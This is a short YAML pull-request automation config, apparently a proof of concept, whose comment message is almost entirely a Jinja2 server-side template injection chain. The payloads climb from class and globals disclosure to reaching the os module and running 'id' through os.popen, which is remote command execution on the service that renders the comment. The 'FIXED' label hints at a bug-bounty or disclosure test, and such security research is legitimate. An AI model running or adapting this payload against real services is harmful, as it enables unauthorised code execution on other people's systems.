pull_request_rules:
  - name: ssti-poc
    conditions: []
    actions:
      comment:
        message: |
          PoC-G4o7T-FIXED:
          S1-author: {{ author }}
          S2-cls-cycler: {{ ''|attr('format')('{0.__class__}', cycler) }}
          S3-fn-lipsum-type: {{ ''|attr('format')('{0.__class__}', lipsum) }}
          S4-globals: {{ ''|attr('format')('{0.__globals__}', lipsum) }}
          S6-getitem-os: {{ ''|attr('format')('{0.__globals__[os]}', lipsum) }}
          S7-rce-id: {{ ''|attr('format')('{0.__globals__[os].popen(arg).read()}', lipsum, arg='id') }}
